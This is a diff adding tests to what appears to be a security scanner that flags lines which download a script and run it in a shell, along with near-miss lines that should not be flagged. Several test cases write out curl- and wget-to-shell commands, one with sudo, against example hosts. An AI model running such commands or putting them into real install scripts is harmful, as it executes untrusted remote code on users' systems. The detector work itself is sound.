@@ -153,3 +153,32 @@ def test_a_download_helper_that_passes_curl_the_output_flag_is_named():
              "downloadFiles(['https://raw.example.com/x/scripts/extension.bk'], 'src/', 'extensionNode.ts')"]
     assert kinds(f("scripts/package.ts", *block)) == [("download-over-source", 10)]
     assert kinds(f("scripts/package.ts", *block[:5], "downloadFiles(['https://x.example/data.json'], 'dist/', 'data.json')")) == []
+
+
+@pytest.mark.parametrize("path,line", [
+    ("scripts/setup.sh", "curl -fsSL https://get.example.com/install.sh | sh"),
+    ("scripts/setup.sh", "wget -qO- https://get.example.com/i | bash"),
+    ("scripts/setup.sh", "curl -s https://x.example/i.sh | sudo bash -s -- --yes"),
+    ("tools/bootstrap.py", 'os.system("curl -fsSL https://x.example/i.sh | sh")'),
+    ("tools/bootstrap.py", 'subprocess.run("wget -qO- https://x.example/i | bash", shell=True)'),
+    ("scripts/setup.sh", 'sh -c "$(curl -fsSL https://x.example/install.sh)"'),
+    ("scripts/setup.sh", "bash <(curl -s https://x.example/i.sh)"),
+    ("Makefile", "\tcurl https://x.example/i.sh | zsh"),
+])
+def test_a_download_run_by_a_shell_is_named(path, line):
+    assert kinds(f(path, line)) == [("download-and-run", 10)]
+
+
+@pytest.mark.parametrize("line", [
+    "curl -fsSL https://x.example/i.sh -o install.sh", "curl https://x.example/data.json | jq .", "wget -qO- https://x.example | tee out",
+    "curl https://x.example/a; sh build.sh", "curl -s https://x.example/d.json -o d.json; cat local.sh | sh", "# curl https://x.example/i.sh | sh", "bash <(cat local.sh)", 'sh -c "$(cat local.sh)"',
+])
+def test_a_download_not_run_by_a_shell_is_not(line):
+    assert kinds(f("scripts/setup.sh", line)) == []
+
+
+def test_in_ci_files_and_dockerfiles_the_moving_check_names_it_instead():
+    line = "curl -fsSL https://x.example/i.sh | sh"
+    for path in (".gitlab-ci.yml", "Dockerfile"):
+        assert kinds(f(path, "  - " + line if path.endswith(".yml") else "RUN " + line)) == []
+    assert "downloads a script and runs it" in SH.sentence(SH.find([f("scripts/a.sh", line)]))
